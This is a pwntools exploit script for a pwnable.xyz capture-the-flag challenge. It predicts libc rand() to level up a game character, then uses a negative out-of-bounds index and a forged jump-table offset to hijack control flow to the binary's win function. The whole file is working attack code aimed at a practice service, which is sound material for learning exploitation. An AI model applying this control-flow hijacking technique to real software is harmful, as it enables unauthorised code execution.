from pwn import *
from ctypes import CDLL

libc = CDLL("libc.so.6")
# libc.srand(42)
# print(libc.rand() % 32768)


#### Quests
# 0. "Talk to Xur."
# 1. "Do favor for Hexer."
# 2. "Gather mushrooms for Ovlow."
# 3. "Go to Shifttrath City."

# Pwnable.xyz Message challenge

MAX_UINT = u32(p32(-1, sign="signed"), sign="unsigned")

context(kernel="amd64", arch="amd64", log_level="info")

def find_quest_number(p):
	sample = p.recv(4)
	if sample == b"Talk": return 0
	if sample == b"Do f": return 1
	if sample == b"Gath": return 2
	if sample == b"Take": return 3
	print("[-] Unknown quest name: ", sample)
	exit(0)

def read_hero_info(p):
	p.recvuntil(b" /  Name: ")
	name = p.recvuntil(b"\n")[:-1]
	p.recvuntil(b"Level: ")
	level = int(p.recvuntil(b"\n")[:-1])
	p.recvuntil(b"HP: ")
	hp = int(p.recvuntil(b"\n")[:-1])
	p.recvuntil(b"_I    /\n")

	print(f"Your hero: {name}\n Level: {level}     HP: {hp} ")
	return level


def play_pvp(p):
	pass


# There should be other function when level > 5
def play_low_quest(p):
	p.sendlineafter(b"> ", b"2")
	quest_number = find_quest_number(p)
	p.recvuntil(b"Quest: ")
	answer = p.recvuntil(b"\n")
	mb_rand = u32(answer[:4].ljust(4, b"\x00"))
	cur_rand = libc.rand()
	print(f"Retrieved random number: {mb_rand} and cur: {cur_rand}")
	cur_rand = mb_rand

	if quest_number == 0:
		p.sendline( str(cur_rand).encode("utf-8") )
	elif quest_number == 1:
		p.send( p32(cur_rand) )
	elif quest_number == 2:
		rand_signed = -u32(p32(cur_rand, sign="unsigned"), sign="signed")

		p.sendline(str(rand_signed).encode("utf-8"))
	elif quest_number == 3:
		p.sendline(b"32")

# Leak srand and exit address, find out version of libc
def play_high_quest(p, quest_pos, quest):
	p.sendlineafter(b"> ", b"2")
	# Make quests[inp] pointing to the got table
	p.sendlineafter(b"Pick a quest: ", str(quest_pos).encode("utf-8") )
	# srand_leak = p.recvuntil(b"\n\t")[:-2]
	if not quest:
		print(f"\n\n[+] Flag: {p.recvrepeat()}\n")
		return
	exit_leak = p.recvuntil(b"\nQuest", timeout=0.1)[:-6]
	# srand_addr = (0x7fff << 32) + u32(srand_leak[:4].ljust(4, b"\x00"))
	# exit_addr = (0x7fff << 32) + u32(exit_leak[:4].ljust(4, b"\x00"))
	# print(f"Leaked address of Srand: {hex(srand_addr)} Exit: {hex(exit_addr)}")
	p.send(quest)



def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		libc.srand(libc.time(0))
		# gdb.attach(p)
		# sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30042)

	win_addr = e.symbols["win"]
	jump_win_diff = 0xFFFFF418
	s2_addr = 0x6025E0
	jump_table_addr = 0x401674

	############## Outdated
	# Diff between jump table and win: 0xFFFFF418
	# Use negative index in array quests  (quest = quests-196*n)
	# Now [quest->quest_number]*4+0x401674 (offset +0xc0 192) should point to memory with offset between jump_table and win

	# If [quest->quest_number] == 0x803d3, than we should set answer to  0xFFFFF418 (using xor operand)
	# Else [quest->quest_number] == 0x803db,0x803dc,0x803dd,0x803de, than set s2 to p32(0xFFFFF418)*4
	##############

	# If Set Quest number to 0x9e0a72f0539782a0 (It will be a negative number, so pass check at pve())
	# quest_number should be pointing to s2
	# We should set s2 to 0xFFFFF418
	# [[quest+0xc0]*4+jump_table]+jump_table == win
	# [quest+0xc0]*4+jump_table == &jump_win_diff == s2+4
	# quest+0xc0 == s2
	

	# // Init character
	# Dummy rand in create_char
	libc.rand()
	p.sendafter(b"Name: ", b"Test")
	p.sendafter(b"Race: ", b"TestRace")
	p.sendafter(b"Class: ", b"TestClass")

	level = read_hero_info(p)

	while level != 6:
		# Dummy
		libc.rand()
		play_low_quest(p)
		level = read_hero_info(p)


	play_high_quest(p, 1, p32((s2_addr+4-jump_table_addr)//4)+p32(jump_win_diff))
	play_high_quest(p, u64(p64(0x9e0a72f0539782a0), sign=True), b"")




main()

# Taken from https://wogh8732.tistory.com/238

# i=0
# while True:
# 	if ( 0x280 + (1<<64) * i ) % 0xc4 == 0:
# 		#log.info('----------------------'+str(i))
# 		print(str(i))
# 		#pause()
# 		oob=((1<<64) * i + 0x280 )//0xc4
# 		# log.info(oob)
# 		print(hex(oob))
# 		pause()
# 		i=i+1
# 		if oob<=0x7fffffffffffffff:
# 			continue
# 		else:
# 			break
# 	else:
# 		i=i+1